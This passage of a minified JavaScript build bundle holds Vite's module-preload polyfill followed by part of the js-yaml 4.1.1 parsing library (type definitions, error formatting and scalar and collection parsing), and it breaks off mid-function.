(function(){const r=document.createElement("link").relList;if(r&&r.supports&&r.supports("modulepreload"))return;for(const t of document.querySelectorAll('link[rel="modulepreload"]'))i(t);new MutationObserver(t=>{for(const o of t)if(o.type==="childList")for(const s of o.addedNodes)s.tagName==="LINK"&&s.rel==="modulepreload"&&i(s)}).observe(document,{childList:!0,subtree:!0});function n(t){const o={};return t.integrity&&(o.integrity=t.integrity),t.referrerPolicy&&(o.referrerPolicy=t.referrerPolicy),t.crossOrigin==="use-credentials"?o.credentials="include":t.crossOrigin==="anonymous"?o.credentials="omit":o.credentials="same-origin",o}function i(t){if(t.ep)return;t.ep=!0;const o=n(t);fetch(t.href,o)}})();/*! js-yaml 4.1.1 https://github.com/nodeca/js-yaml @license MIT */function tr(e){return typeof e>"u"||e===null}function en(e){return typeof e=="object"&&e!==null}function rn(e){return Array.isArray(e)?e:tr(e)?[]:[e]}function nn(e,r){var n,i,t,o;if(r)for(o=Object.keys(r),n=0,i=o.length;n<i;n+=1)t=o[n],e[t]=r[t];return e}function tn(e,r){var n="",i;for(i=0;i<r;i+=1)n+=e;return n}function on(e){return e===0&&Number.NEGATIVE_INFINITY===1/e}var sn=tr,an=en,ln=rn,cn=tn,An=on,un=nn,R={isNothing:sn,isObject:an,toArray:ln,repeat:cn,isNegativeZero:An,extend:un};function ir(e,r){var n="",i=e.reason||"(unknown reason)";return e.mark?(e.mark.name&&(n+='in "'+e.mark.name+'" '),n+="("+(e.mark.line+1)+":"+(e.mark.column+1)+")",!r&&e.mark.snippet&&(n+=`

`+e.mark.snippet),i+" "+n):i}function Q(e,r){Error.call(this),this.name="YAMLException",this.reason=e,this.mark=r,this.message=ir(this,!1),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=new Error().stack||""}Q.prototype=Object.create(Error.prototype);Q.prototype.constructor=Q;Q.prototype.toString=function(r){return this.name+": "+ir(this,r)};var L=Q;function Se(e,r,n,i,t){var o="",s="",a=Math.floor(t/2)-1;return i-r>a&&(o=" ... ",r=i-a+o.length),n-i>a&&(s=" ...",n=i+a-s.length),{str:o+e.slice(r,n).replace(/\t/g,"→")+s,pos:i-r+o.length}}function Oe(e,r){return R.repeat(" ",r-e.length)+e}function pn(e,r){if(r=Object.create(r||null),!e.buffer)return null;r.maxLength||(r.maxLength=79),typeof r.indent!="number"&&(r.indent=1),typeof r.linesBefore!="number"&&(r.linesBefore=3),typeof r.linesAfter!="number"&&(r.linesAfter=2);for(var n=/\r?\n|\r|\0/g,i=[0],t=[],o,s=-1;o=n.exec(e.buffer);)t.push(o.index),i.push(o.index+o[0].length),e.position<=o.index&&s<0&&(s=i.length-2);s<0&&(s=i.length-1);var a="",l,c,u=Math.min(e.line+r.linesAfter,t.length).toString().length,A=r.maxLength-(r.indent+u+3);for(l=1;l<=r.linesBefore&&!(s-l<0);l++)c=Se(e.buffer,i[s-l],t[s-l],e.position-(i[s]-i[s-l]),A),a=R.repeat(" ",r.indent)+Oe((e.line-l+1).toString(),u)+" | "+c.str+`
`+a;for(c=Se(e.buffer,i[s],t[s],e.position,A),a+=R.repeat(" ",r.indent)+Oe((e.line+1).toString(),u)+" | "+c.str+`
`,a+=R.repeat("-",r.indent+u+3+c.pos)+`^
`,l=1;l<=r.linesAfter&&!(s+l>=t.length);l++)c=Se(e.buffer,i[s+l],t[s+l],e.position-(i[s]-i[s+l]),A),a+=R.repeat(" ",r.indent)+Oe((e.line+l+1).toString(),u)+" | "+c.str+`
`;return a.replace(/\n$/,"")}var _n=pn,En=["kind","multi","resolve","construct","instanceOf","predicate","represent","representName","defaultStyle","styleAliases"],Tn=["scalar","sequence","mapping"];function dn(e){var r={};return e!==null&&Object.keys(e).forEach(function(n){e[n].forEach(function(i){r[String(i)]=n})}),r}function fn(e,r){if(r=r||{},Object.keys(r).forEach(function(n){if(En.indexOf(n)===-1)throw new L('Unknown option "'+n+'" is met in definition of "'+e+'" YAML type.')}),this.options=r,this.tag=e,this.kind=r.kind||null,this.resolve=r.resolve||function(){return!0},this.construct=r.construct||function(n){return n},this.instanceOf=r.instanceOf||null,this.predicate=r.predicate||null,this.represent=r.represent||null,this.representName=r.representName||null,this.defaultStyle=r.defaultStyle||null,this.multi=r.multi||!1,this.styleAliases=dn(r.styleAliases||null),Tn.indexOf(this.kind)===-1)throw new L('Unknown kind "'+this.kind+'" is specified for "'+e+'" YAML type.')}var D=fn;function Fe(e,r){var n=[];return e[r].forEach(function(i){var t=n.length;n.forEach(function(o,s){o.tag===i.tag&&o.kind===i.kind&&o.multi===i.multi&&(t=s)}),n[t]=i}),n}function Sn(){var e={scalar:{},sequence:{},mapping:{},fallback:{},multi:{scalar:[],sequence:[],mapping:[],fallback:[]}},r,n;function i(t){t.multi?(e.multi[t.kind].push(t),e.multi.fallback.push(t)):e[t.kind][t.tag]=e.fallback[t.tag]=t}for(r=0,n=arguments.length;r<n;r+=1)arguments[r].forEach(i);return e}function me(e){return this.extend(e)}me.prototype.extend=function(r){var n=[],i=[];if(r instanceof D)i.push(r);else if(Array.isArray(r))i=i.concat(r);else if(r&&(Array.isArray(r.implicit)||Array.isArray(r.explicit)))r.implicit&&(n=n.concat(r.implicit)),r.explicit&&(i=i.concat(r.explicit));else throw new L("Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })");n.forEach(function(o){if(!(o instanceof D))throw new L("Specified list of YAML types (or a single Type object) contains a non-Type object.");if(o.loadKind&&o.loadKind!=="scalar")throw new L("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.");if(o.multi)throw new L("There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit.")}),i.forEach(function(o){if(!(o instanceof D))throw new L("Specified list of YAML types (or a single Type object) contains a non-Type object.")});var t=Object.create(me.prototype);return t.implicit=(this.implicit||[]).concat(n),t.explicit=(this.explicit||[]).concat(i),t.compiledImplicit=Fe(t,"implicit"),t.compiledExplicit=Fe(t,"explicit"),t.compiledTypeMap=Sn(t.compiledImplicit,t.compiledExplicit),t};var or=me,sr=new D("tag:yaml.org,2002:str",{kind:"scalar",construct:function(e){return e!==null?e:""}}),ar=new D("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(e){return e!==null?e:[]}}),lr=new D("tag:yaml.org,2002:map",{kind:"mapping",construct:function(e){return e!==null?e:{}}}),cr=new or({explicit:[sr,ar,lr]});function On(e){if(e===null)return!0;var r=e.length;return r===1&&e==="~"||r===4&&(e==="null"||e==="Null"||e==="NULL")}function In(){return null}function hn(e){return e===null}var Ar=new D("tag:yaml.org,2002:null",{kind:"scalar",resolve:On,construct:In,predicate:hn,represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"},empty:function(){return""}},defaultStyle:"lowercase"});function Nn(e){if(e===null)return!1;var r=e.length;return r===4&&(e==="true"||e==="True"||e==="TRUE")||r===5&&(e==="false"||e==="False"||e==="FALSE")}function mn(e){return e==="true"||e==="True"||e==="TRUE"}function Rn(e){return Object.prototype.toString.call(e)==="[object Boolean]"}var ur=new D("tag:yaml.org,2002:bool",{kind:"scalar",resolve:Nn,construct:mn,predicate:Rn,represent:{lowercase:function(e){return e?"true":"false"},uppercase:function(e){return e?"TRUE":"FALSE"},camelcase:function(e){return e?"True":"False"}},defaultStyle:"lowercase"});function Cn(e){return 48<=e&&e<=57||65<=e&&e<=70||97<=e&&e<=102}function Dn(e){return 48<=e&&e<=55}function gn(e){return 48<=e&&e<=57}function Ln(e){if(e===null)return!1;var r=e.length,n=0,i=!1,t;if(!r)return!1;if(t=e[n],(t==="-"||t==="+")&&(t=e[++n]),t==="0"){if(n+1===r)return!0;if(t=e[++n],t==="b"){for(n++;n<r;n++)if(t=e[n],t!=="_"){if(t!=="0"&&t!=="1")return!1;i=!0}return i&&t!=="_"}if(t==="x"){for(n++;n<r;n++)if(t=e[n],t!=="_"){if(!Cn(e.charCodeAt(n)))return!1;i=!0}return i&&t!=="_"}if(t==="o"){for(n++;n<r;n++)if(t=e[n],t!=="_"){if(!Dn(e.charCodeAt(n)))return!1;i=!0}return i&&t!=="_"}}if(t==="_")return!1;for(;n<r;n++)if(t=e[n],t!=="_"){if(!gn(e.charCodeAt(n)))return!1;i=!0}return!(!i||t==="_")}function Pn(e){var r=e,n=1,i;if(r.indexOf("_")!==-1&&(r=r.replace(/_/g,"")),i=r[0],(i==="-"||i==="+")&&(i==="-"&&(n=-1),r=r.slice(1),i=r[0]),r==="0")return 0;if(i==="0"){if(r[1]==="b")return n*parseInt(r.slice(2),2);if(r[1]==="x")return n*parseInt(r.slice(2),16);if(r[1]==="o")return n*parseInt(r.slice(2),8)}return n*parseInt(r,10)}function vn(e){return Object.prototype.toString.call(e)==="[object Number]"&&e%1===0&&!R.isNegativeZero(e)}var pr=new D("tag:yaml.org,2002:int",{kind:"scalar",resolve:Ln,construct:Pn,predicate:vn,represent:{binary:function(e){return e>=0?"0b"+e.toString(2):"-0b"+e.toString(2).slice(1)},octal:function(e){return e>=0?"0o"+e.toString(8):"-0o"+e.toString(8).slice(1)},decimal:function(e){return e.toString(10)},hexadecimal:function(e){return e>=0?"0x"+e.toString(16).toUpperCase():"-0x"+e.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),yn=new RegExp("^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");function Mn(e){return!(e===null||!yn.test(e)||e[e.length-1]==="_")}function xn(e){var r,n;return r=e.replace(/_/g,"").toLowerCase(),n=r[0]==="-"?-1:1,"+-".indexOf(r[0])>=0&&(r=r.slice(1)),r===".inf"?n===1?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY:r===".nan"?NaN:n*parseFloat(r,10)}var Gn=/^[-+]?[0-9]+e/;function Un(e,r){var n;if(isNaN(e))switch(r){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===e)switch(r){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===e)switch(r){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(R.isNegativeZero(e))return"-0.0";return n=e.toString(10),Gn.test(n)?n.replace("e",".e"):n}function Hn(e){return Object.prototype.toString.call(e)==="[object Number]"&&(e%1!==0||R.isNegativeZero(e))}var _r=new D("tag:yaml.org,2002:float",{kind:"scalar",resolve:Mn,construct:xn,predicate:Hn,represent:Un,defaultStyle:"lowercase"}),Er=cr.extend({implicit:[Ar,ur,pr,_r]}),Tr=Er,dr=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),fr=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");function wn(e){return e===null?!1:dr.exec(e)!==null||fr.exec(e)!==null}function Fn(e){var r,n,i,t,o,s,a,l=0,c=null,u,A,p;if(r=dr.exec(e),r===null&&(r=fr.exec(e)),r===null)throw new Error("Date resolve error");if(n=+r[1],i=+r[2]-1,t=+r[3],!r[4])return new Date(Date.UTC(n,i,t));if(o=+r[4],s=+r[5],a=+r[6],r[7]){for(l=r[7].slice(0,3);l.length<3;)l+="0";l=+l}return r[9]&&(u=+r[10],A=+(r[11]||0),c=(u*60+A)*6e4,r[9]==="-"&&(c=-c)),p=new Date(Date.UTC(n,i,t,o,s,a,l)),c&&p.setTime(p.getTime()-c),p}function Bn(e){return e.toISOString()}var Sr=new D("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:wn,construct:Fn,instanceOf:Date,represent:Bn});function bn(e){return e==="<<"||e===null}var Or=new D("tag:yaml.org,2002:merge",{kind:"scalar",resolve:bn}),ve=`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
\r`;function Yn(e){if(e===null)return!1;var r,n,i=0,t=e.length,o=ve;for(n=0;n<t;n++)if(r=o.indexOf(e.charAt(n)),!(r>64)){if(r<0)return!1;i+=6}return i%8===0}function kn(e){var r,n,i=e.replace(/[\r\n=]/g,""),t=i.length,o=ve,s=0,a=[];for(r=0;r<t;r++)r%4===0&&r&&(a.push(s>>16&255),a.push(s>>8&255),a.push(s&255)),s=s<<6|o.indexOf(i.charAt(r));return n=t%4*6,n===0?(a.push(s>>16&255),a.push(s>>8&255),a.push(s&255)):n===18?(a.push(s>>10&255),a.push(s>>2&255)):n===12&&a.push(s>>4&255),new Uint8Array(a)}function Wn(e){var r="",n=0,i,t,o=e.length,s=ve;for(i=0;i<o;i++)i%3===0&&i&&(r+=s[n>>18&63],r+=s[n>>12&63],r+=s[n>>6&63],r+=s[n&63]),n=(n<<8)+e[i];return t=o%3,t===0?(r+=s[n>>18&63],r+=s[n>>12&63],r+=s[n>>6&63],r+=s[n&63]):t===2?(r+=s[n>>10&63],r+=s[n>>4&63],r+=s[n<<2&63],r+=s[64]):t===1&&(r+=s[n>>2&63],r+=s[n<<4&63],r+=s[64],r+=s[64]),r}function $n(e){return Object.prototype.toString.call(e)==="[object Uint8Array]"}var Ir=new D("tag:yaml.org,2002:binary",{kind:"scalar",resolve:Yn,construct:kn,predicate:$n,represent:Wn}),Vn=Object.prototype.hasOwnProperty,qn=Object.prototype.toString;function Kn(e){if(e===null)return!0;var r=[],n,i,t,o,s,a=e;for(n=0,i=a.length;n<i;n+=1){if(t=a[n],s=!1,qn.call(t)!=="[object Object]")return!1;for(o in t)if(Vn.call(t,o))if(!s)s=!0;else return!1;if(!s)return!1;if(r.indexOf(o)===-1)r.push(o);else return!1}return!0}function Xn(e){return e!==null?e:[]}var hr=new D("tag:yaml.org,2002:omap",{kind:"sequence",resolve:Kn,construct:Xn}),Jn=Object.prototype.toString;function jn(e){if(e===null)return!0;var r,n,i,t,o,s=e;for(o=new Array(s.length),r=0,n=s.length;r<n;r+=1){if(i=s[r],Jn.call(i)!=="[object Object]"||(t=Object.keys(i),t.length!==1))return!1;o[r]=[t[0],i[t[0]]]}return!0}function Qn(e){if(e===null)return[];var r,n,i,t,o,s=e;for(o=new Array(s.length),r=0,n=s.length;r<n;r+=1)i=s[r],t=Object.keys(i),o[r]=[t[0],i[t[0]]];return o}var Nr=new D("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:jn,construct:Qn}),zn=Object.prototype.hasOwnProperty;function Zn(e){if(e===null)return!0;var r,n=e;for(r in n)if(zn.call(n,r)&&n[r]!==null)return!1;return!0}function et(e){return e!==null?e:{}}var mr=new D("tag:yaml.org,2002:set",{kind:"mapping",resolve:Zn,construct:et}),ye=Tr.extend({implicit:[Sr,Or],explicit:[Ir,hr,Nr,mr]}),w=Object.prototype.hasOwnProperty,oe=1,Rr=2,Cr=3,se=4,Ie=1,rt=2,Be=3,nt=/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,tt=/[\x85\u2028\u2029]/,it=/[,\[\]\{\}]/,Dr=/^(?:!|!!|![a-z\-]+!)$/i,gr=/^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;function be(e){return Object.prototype.toString.call(e)}function y(e){return e===10||e===13}function B(e){return e===9||e===32}function P(e){return e===9||e===32||e===10||e===13}function W(e){return e===44||e===91||e===93||e===123||e===125}function ot(e){var r;return 48<=e&&e<=57?e-48:(r=e|32,97<=r&&r<=102?r-97+10:-1)}function st(e){return e===120?2:e===117?4:e===85?8:0}function at(e){return 48<=e&&e<=57?e-48:-1}function Ye(e){return e===48?"\0":e===97?"\x07":e===98?"\b":e===116||e===9?"	":e===110?`
`:e===118?"\v":e===102?"\f":e===114?"\r":e===101?"\x1B":e===32?" ":e===34?'"':e===47?"/":e===92?"\\":e===78?"":e===95?" ":e===76?"\u2028":e===80?"\u2029":""}function lt(e){return e<=65535?String.fromCharCode(e):String.fromCharCode((e-65536>>10)+55296,(e-65536&1023)+56320)}function Lr(e,r,n){r==="__proto__"?Object.defineProperty(e,r,{configurable:!0,enumerable:!0,writable:!0,value:n}):e[r]=n}var Pr=new Array(256),vr=new Array(256);for(var Y=0;Y<256;Y++)Pr[Y]=Ye(Y)?1:0,vr[Y]=Ye(Y);function ct(e,r){this.input=e,this.filename=r.filename||null,this.schema=r.schema||ye,this.onWarning=r.onWarning||null,this.legacy=r.legacy||!1,this.json=r.json||!1,this.listener=r.listener||null,this.implicitTypes=this.schema.compiledImplicit,this.typeMap=this.schema.compiledTypeMap,this.length=e.length,this.position=0,this.line=0,this.lineStart=0,this.lineIndent=0,this.firstTabInLine=-1,this.documents=[]}function yr(e,r){var n={name:e.filename,buffer:e.input.slice(0,-1),position:e.position,line:e.line,column:e.position-e.lineStart};return n.snippet=_n(n),new L(r,n)}function T(e,r){throw yr(e,r)}function ae(e,r){e.onWarning&&e.onWarning.call(null,yr(e,r))}var ke={YAML:function(r,n,i){var t,o,s;r.version!==null&&T(r,"duplication of %YAML directive"),i.length!==1&&T(r,"YAML directive accepts exactly one argument"),t=/^([0-9]+)\.([0-9]+)$/.exec(i[0]),t===null&&T(r,"ill-formed argument of the YAML directive"),o=parseInt(t[1],10),s=parseInt(t[2],10),o!==1&&T(r,"unacceptable YAML version of the document"),r.version=i[0],r.checkLineBreaks=s<2,s!==1&&s!==2&&ae(r,"unsupported YAML version of the document")},TAG:function(r,n,i){var t,o;i.length!==2&&T(r,"TAG directive accepts exactly two arguments"),t=i[0],o=i[1],Dr.test(t)||T(r,"ill-formed tag handle (first argument) of the TAG directive"),w.call(r.tagMap,t)&&T(r,'there is a previously declared suffix for "'+t+'" tag handle'),gr.test(o)||T(r,"ill-formed tag prefix (second argument) of the TAG directive");try{o=decodeURIComponent(o)}catch{T(r,"tag prefix is malformed: "+o)}r.tagMap[t]=o}};function H(e,r,n,i){var t,o,s,a;if(r<n){if(a=e.input.slice(r,n),i)for(t=0,o=a.length;t<o;t+=1)s=a.charCodeAt(t),s===9||32<=s&&s<=1114111||T(e,"expected valid JSON character");else nt.test(a)&&T(e,"the stream contains non-printable characters");e.result+=a}}function We(e,r,n,i){var t,o,s,a;for(R.isObject(n)||T(e,"cannot merge mappings; the provided source object is unacceptable"),t=Object.keys(n),s=0,a=t.length;s<a;s+=1)o=t[s],w.call(r,o)||(Lr(r,o,n[o]),i[o]=!0)}function $(e,r,n,i,t,o,s,a,l){var c,u;if(Array.isArray(t))for(t=Array.prototype.slice.call(t),c=0,u=t.length;c<u;c+=1)Array.isArray(t[c])&&T(e,"nested arrays are not supported inside keys"),typeof t=="object"&&be(t[c])==="[object Object]"&&(t[c]="[object Object]");if(typeof t=="object"&&be(t)==="[object Object]"&&(t="[object Object]"),t=String(t),r===null&&(r={}),i==="tag:yaml.org,2002:merge")if(Array.isArray(o))for(c=0,u=o.length;c<u;c+=1)We(e,r,o[c],n);else We(e,r,o,n);else!e.json&&!w.call(n,t)&&w.call(r,t)&&(e.line=s||e.line,e.lineStart=a||e.lineStart,e.position=l||e.position,T(e,"duplicated mapping key")),Lr(r,t,o),delete n[t];return r}function Me(e){var r;r=e.input.charCodeAt(e.position),r===10?e.position++:r===13?(e.position++,e.input.charCodeAt(e.position)===10&&e.position++):T(e,"a line break is expected"),e.line+=1,e.lineStart=e.position,e.firstTabInLine=-1}function N(e,r,n){for(var i=0,t=e.input.charCodeAt(e.position);t!==0;){for(;B(t);)t===9&&e.firstTabInLine===-1&&(e.firstTabInLine=e.position),t=e.input.charCodeAt(++e.position);if(r&&t===35)do t=e.input.charCodeAt(++e.position);while(t!==10&&t!==13&&t!==0);if(y(t))for(Me(e),t=e.input.charCodeAt(e.position),i++,e.lineIndent=0;t===32;)e.lineIndent++,t=e.input.charCodeAt(++e.position);else break}return n!==-1&&i!==0&&e.lineIndent<n&&ae(e,"deficient indentation"),i}function pe(e){var r=e.position,n;return n=e.input.charCodeAt(r),!!((n===45||n===46)&&n===e.input.charCodeAt(r+1)&&n===e.input.charCodeAt(r+2)&&(r+=3,n=e.input.charCodeAt(r),n===0||P(n)))}function xe(e,r){r===1?e.result+=" ":r>1&&(e.result+=R.repeat(`
`,r-1))}function At(e,r,n){var i,t,o,s,a,l,c,u,A=e.kind,p=e.result,_;if(_=e.input.charCodeAt(e.position),P(_)||W(_)||_===35||_===38||_===42||_===33||_===124||_===62||_===39||_===34||_===37||_===64||_===96||(_===63||_===45)&&(t=e.input.charCodeAt(e.position+1),P(t)||n&&W(t)))return!1;for(e.kind="scalar",e.result="",o=s=e.position,a=!1;_!==0;){if(_===58){if(t=e.input.charCodeAt(e.position+1),P(t)||n&&W(t))break}else if(_===35){if(i=e.input.charCodeAt(e.position-1),P(i))break}else{if(e.position===e.lineStart&&pe(e)||n&&W(_))break;if(y(_))if(l=e.line,c=e.lineStart,u=e.lineIndent,N(e,!1,-1),e.lineIndent>=r){a=!0,_=e.input.charCodeAt(e.position);continue}else{e.position=s,e.line=l,e.lineStart=c,e.lineIndent=u;break}}a&&(H(e,o,s,!1),xe(e,e.line-l),o=s=e.position,a=!1),B(_)||(s=e.position+1),_=e.input.charCodeAt(++e.position)}return H(e,o,s,!1),e.result?!0:(e.kind=A,e.result=p,!1)}function ut(e,r){var n,i,t;if(n=e.input.charCodeAt(e.position),n!==39)return!1;for(e.kind="scalar",e.result="",e.position++,i=t=e.position;(n=e.input.charCodeAt(e.position))!==0;)if(n===39)if(H(e,i,e.position,!0),n=e.input.charCodeAt(++e.position),n===39)i=e.position,e.position++,t=e.position;else return!0;else y(n)?(H(e,i,t,!0),xe(e,N(e,!1,r)),i=t=e.position):e.position===e.lineStart&&pe(e)?T(e,"unexpected end of the document within a single quoted scalar"):(e.position++,t=e.position);T(e,"unexpected end of the stream within a single quoted scalar")}function pt(e,r){var n,i,t,o,s,a;if(a=e.input.charCodeAt(e.position),a!==34)return!1;for(e.kind="scalar",e.result="",e.position++,n=i=e.position;(a=e.input.charCodeAt(e.position))!==0;){if(a===34)return H(e,n,e.position,!0),e.position++,!0;if(a===92){if(H(e,n,e.position,!0),a=e.input.charCodeAt(++e.position),y(a))N(e,!1,r);else if(a<256&&Pr[a])e.result+=vr[a],e.position++;else if((s=st(a))>0){for(t=s,o=0;t>0;t--)a=e.input.charCodeAt(++e.position),(s=ot(a))>=0?o=(o<<4)+s:T(e,"expected hexadecimal character");e.result+=lt(o),e.position++}else T(e,"unknown escape sequence");n=i=e.position}else y(a)?(H(e,n,i,!0),xe(e,N(e,!1,r)),n=i=e.position):e.position===e.lineStart&&pe(e)?T(e,"unexpected end of the document within a double quoted scalar"):(e.position++,i=e.position)}T(e,"unexpected end of the stream within a double quoted scalar")}function _t(e,r){var n=!0,i,t,o,s=e.tag,a,l=e.anchor,c,u,A,p,_,d=Object.create(null),E,S,O,f;if(f=e.input.charCodeAt(e.position),f===91)u=93,_=!1,a=[];else if(f===123)u=125,_=!0,a={};else return!1;for(e.anchor!==null&&(e.anchorMap[e.anchor]=a),f=e.input.charCodeAt(++e.position);f!==0;){if(N(e,!0,r),f=e.input.charCodeAt(e.position),f===u)return e.position++,e.tag=s,e.anchor=l,e.kind=_?"mapping":"sequence",e.result=a,!0;n?f===44&&T(e,"expected the node content, but found ','"):T(e,"missed comma between flow collection entries"),S=E=O=null,A=p=!1,f===63&&(c=e.input.charCodeAt(e.position+1),P(c)&&(A=p=!0,e.position++,N(e,!0,r))),i=e.line,t=e.lineStart,o=e.position,V(e,r,oe,!1,!0),S=e.tag,E=e.result,N(e,!0,r),f=e.input.charCodeAt(e.position),(p||e.line===i)&&f===58&&(A=!0,f=e.input.charCodeAt(++e.position),N(e,!0,r),V(e,r,oe,!1,!0),O=e.result),_?$(e,a,d,S,E,O,i,t,o):A?a.push($(e,null,d,S,E,O,i,t,o)):a.push(E),N(e,!0,r),f=e.input.charCodeAt(e.position),f===44?(n=!0,f=e.input.charCodeAt(++e.position)):n=!1}T(e,"unexpected end of the stream within a flow collection")}function Et(e,r){var n,i,t=Ie,o=!1,s=!1,a=r,l=0,c=!1,u,A;if(A=e.input.charCodeAt(e.position),A===124)i=!1;else if(A===62)i=!0;else return!1;for(e.kind="scalar",e.result="";A!==0;)if(A=e.input.charCodeAt(++e.position),A===43||A===45)Ie===t?t=A===43?Be:rt:T(e,"repeat of a chomping mode identifier");else if((u=at(A))>=0)u===0?T(e,"bad explicit indentation width of a block scalar; it cannot be less than one"):s?T(e,"repeat of an indentation width identifier"):(a=r+u-1,s=!0);else break;if(B(A)){do A=e.input.charCodeAt(++e.position);while(B(A));if(A===35)do A=e.input.charCodeAt(++e.position);while(!y(A)&&A!==0)}for(;A!==0;){for(Me(e),e.lineIndent=0,A=e.input.charCodeAt(e.position);(!s||e.lineIndent<a)&&A===32;)e.lineIndent++,A=e.input.charCodeAt(++e.position);if(!s&&e.lineIndent>a&&(a=e.lineIndent),y(A)){l++;continue}if(e.lineIndent<a){t===Be?e.result+=R.repeat(`
`,o?1+l:l):t===Ie&&o&&(e.result+=`
`);break}for(i?B(A)?(c=!0,e.result+=R.repeat(`
`,o?1+l:l)):c?(c=!1,e.result+=R.repeat(`
`,l+1)):l===0?o&&(e.result+=" "):e.result+=R.repeat(`
`,l):e.result+=R.repeat(`
`,o?1+l:l),o=!0,s=!0,l=0,n=e.position;!y(A)&&A!==0;)A=e.input.charCodeAt(++e.position);H(e,n,e.position,!1)}return!0}function $e(e,r){var n,i=e.tag,t=e.anchor,o=[],s,a=!1,l;if(e.firstTabInLine!==-1)return!1;for(e.anchor!==null&&(e.anchorMap[e.anchor]=o),l=e.input.charCodeAt(e.position);l!==0&&(e.firstTabInLine!==-1&&(e.position=e.firstTabInLine,T(e,"tab characters must not be used in indentation")),!(l!==45||(s=e.input.charCodeAt(e.position+1),!P(s))));){if(a=!0,e.position++,N(e,!0,-1)&&e.lineIndent<=r){o.push(null),l=e.input.charCodeAt(e.position);continue}if(n=e.line,V(e,r,Cr,!1,!0),o.push(e.result),N(e,!0,-1),l=e.input.charCodeAt(e.position),(e.line===n||e.lineIndent>r)&&l!==0)T(e,"bad indentation of a sequence entry");else if(e.lineIndent<r)break}return a?(e.tag=i,e.anchor=t,e.kind="sequence",e.result=o,!0):!1}function Tt(e,r,n){var i,t,o,s,a,l,c=e.tag,u=e.anchor,A={},p=Object.create(null),_=null,d=null,E=null,S=!1,O=!1,f;if(e.firstTabInLine!==-1)return!1;for(e.anchor!==null&&(e.anchorMap[e.anchor]=A),f=e.input.charCodeAt(e.position);f!==0;){if(!S&&e.firstTabInLine!==-1&&(e.position=e.firstTabInLine,T(e,"tab characters must not be used in indentation")),i=e.input.charCodeAt(e.position+1),o=e.line,(f===63||f===58)&&P(i))f===63?(S&&($(e,A,p,_,d,null,s,a,l),_=d=E=null),O=!0,S=!0,t=!0):S?(S=!1,t=!0):T(e,"incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line"),e.position+=1,f=i;else{if(s=e.line,a=e.lineStart,l=e.position,!V(e,n,Rr,!1,!0))break;if(e.line===o){for(f=e.input.charCodeAt(e.position);B(f);)f=e.input.charCodeAt(++e.position);if(f===58)f=e.input.charCodeAt(++e.position),P(f)||T(e,"a whitespace character is expected after the key-value separator within a block mapping"),S&&($(e,A,p,_,d,null,s,a,l),_=d=E=null),O=!0,S=!1,t=!1,_=e.tag,d=e.result;else if(O)T(e,"can not read an implicit mapping pair; a colon is missed");else return e.tag=c,e.anchor=u,!0}else if(O)T(e,"can not read a block mapping entry; a multiline key may not be an implicit key");else return e.tag=c,e.anchor=u,!0}if((e.line===o||e.lineIndent>r)&&(S&&(s=e.line,a=e.lineStart,l=e.position),V(e,r,se,!0,t)&&(S?d=e.result:E=e.result),S||($(e,A,p,_,d,E,s,a,l),_=d=E=null),N(e,!0,-1),f=e.input.charCodeAt(e.position)),(e.line===o||e.lineIndent>r)&&f!==0)T(e,"bad indentation of a mapping entry");else if(e.lineIndent<r)break}return S&&$(e,A,p,_,d,null,s,a,l),O&&(e.tag=c,e.anchor=u,e.kind="mapping",e.result=A),O}function dt(e){var r,n=!1,i=!1,t,o,s;if(s=e.input.charCodeAt(e.position),s!==33)return!1;if(e.tag!==null&&T(e,"duplication of a tag property"),s=e.input.charCodeAt(++e.position),s===60?(n=!0,s=e.input.charCodeAt(++e.position)):s===33?(i=!0,t="!!",s=e.input.charCodeAt(++e.position)):t="!",r=e.position,n){do s=e.input.charCodeAt(++e.position);while(s!==0&&s!==62);e.position<e.length?(o=e.input.slice(r,e.position),s=e.input.charCodeAt(++e.position)):T(e,"unexpected end of the stream within a verbatim tag")}else{for(;s!==0&&!P(s);)s===33&&(i?T(e,"tag suffix cannot contain exclamation marks"):(t=e.input.slice(r-1,e.position+1),Dr.test(t)||T(e,"named tag handle cannot contain such characters"),i=!0,r=e.position+1)),s=e.input.charCodeAt(++e.position);o=e.input.slice(r,e.position),it.test(o)&&T(e,"tag suffix cannot contain flow indicator characters")}o&&!gr.test(o)&&T(e,"tag name cannot contain such characters: "+o);try{o=decodeURIComponent(o)}catch{T(e,"tag name is malformed: "+o)}return 